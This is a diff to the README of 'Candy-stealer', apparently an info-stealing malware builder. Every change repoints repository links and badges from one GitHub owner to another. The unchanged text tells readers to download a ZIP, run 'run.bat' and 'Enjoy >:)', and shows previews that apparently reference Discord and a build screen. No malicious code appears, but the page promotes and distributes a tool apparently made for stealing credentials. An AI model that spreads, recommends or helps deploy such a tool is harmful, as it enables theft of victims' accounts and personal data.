@@ -1,27 +1,27 @@
 <div align="center">
   <h1><a href="https://github.com/addadi000/Candy-stealer">Candy</a></h1>
-  <img src="https://github.com/nojumpdelay/Candy-stealer/blob/main/.github/img/Candy%20(1).png?raw=true&" width="700" alt="img" />
+  <img src="https://github.com/doxinggirl/Candy-stealer/blob/main/.github/img/Candy%20(1).png?raw=true&" width="700" alt="img" />
 </div>
 
 <div align="center">
-  <a aria-label="GitHub Maintained" href="https://github.com/nojumpdelay/Candy-stealer">
+  <a aria-label="GitHub Maintained" href="https://github.com/doxinggirl/Candy-stealer">
     <img src="https://img.shields.io/badge/Yes-f7e3ff?logo=github&style=flat-square&label=Maintained%3F">
   </a>
-  <a aria-label="License" href="https://github.com/nojumpdelay/Candy-stealer/LICENSE">
-    <img src="https://img.shields.io/github/license/nojumpdelay/Candy-stealer?color=f7e3ff&logo=github&style=flat-square&label=License">
+  <a aria-label="License" href="https://github.com/doxinggirl/Candy-stealer/LICENSE">
+    <img src="https://img.shields.io/github/license/doxinggirl/Candy-stealer?color=f7e3ff&logo=github&style=flat-square&label=License">
   </a>
-  <a aria-label="Version" href="https://github.com/nojumpdelay/Candy-stealer/releases">
-    <img src="https://img.shields.io/github/v/release/nojumpdelay/Candy-stealer?color=f7e3ff&logo=github&style=flat-square&label=Version">
+  <a aria-label="Version" href="https://github.com/doxinggirl/Candy-stealer/releases">
+    <img src="https://img.shields.io/github/v/release/doxinggirl/Candy-stealer?color=f7e3ff&logo=github&style=flat-square&label=Version">
   </a>
-  <a aria-label="Issues" href="https://github.com/nojumpdelay/Candy-stealer/issues">
-    <img src="https://img.shields.io/github/issues/nojumpdelay/Candy-stealer?color=f7e3ff&logo=github&style=flat-square&label=Issues">
+  <a aria-label="Issues" href="https://github.com/doxinggirl/Candy-stealer/issues">
+    <img src="https://img.shields.io/github/issues/doxinggirl/Candy-stealer?color=f7e3ff&logo=github&style=flat-square&label=Issues">
   </a>
-  <a aria-label="Stars" href="https://github.com/nojumpdelay/Candy-stealer/stargazers">
-    <img src="https://img.shields.io/github/stars/nojumpdelay/Candy-stealer?color=f7e3ff&logo=github&style=flat-square&label=Stars">
+  <a aria-label="Stars" href="https://github.com/doxinggirl/Candy-stealer/stargazers">
+    <img src="https://img.shields.io/github/stars/doxinggirl/Candy-stealer?color=f7e3ff&logo=github&style=flat-square&label=Stars">
     <br>
   </a>
-  <a aria-label="Follow" href="https://github.com/nojumpdelay/">
-    <img src="https://img.shields.io/github/followers/nojumpdelay?color=%23000000&label=Follow%20me"> 
+  <a aria-label="Follow" href="https://github.com/doxinggirl/">
+    <img src="https://img.shields.io/github/followers/doxinggirl?color=%23000000&label=Follow%20me"> 
     <br>
   </a>
 </div>
@@ -79,7 +79,7 @@
 > Did an error occur? If you have a GitHub account, please consider opening an issue. We’ll do our best to improve.
 
 - **🔩 Installation Tutorial**  
-To get started, [click here](https://github.com/nojumpdelay/Candy-stealer/archive/refs/heads/main.zip) to download the ZIP file.<br>
+To get started, [click here](https://github.com/doxinggirl/Candy-stealer/archive/refs/heads/main.zip) to download the ZIP file.<br>
 After downloading the ZIP file, extract it and run `run.bat`. Everything else will install automatically<br>
 Enjoy >:)
 
@@ -88,10 +88,10 @@ Enjoy >:)
 ## 🖼️ Preview
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/nojumpdelay/Candy-stealer/refs/heads/main/.github/img/discord1.png" width="500" alt="img" />
+  <img src="https://raw.githubusercontent.com/doxinggirl/Candy-stealer/refs/heads/main/.github/img/discord1.png" width="500" alt="img" />
 
   <h1> <h1>
-  <img src="https://raw.githubusercontent.com/nojumpdelay/Candy-stealer/refs/heads/main/.github/img/build.png" width="900" alt="img" />
+  <img src="https://raw.githubusercontent.com/doxinggirl/Candy-stealer/refs/heads/main/.github/img/build.png" width="900" alt="img" />
 </div>
 
 ---
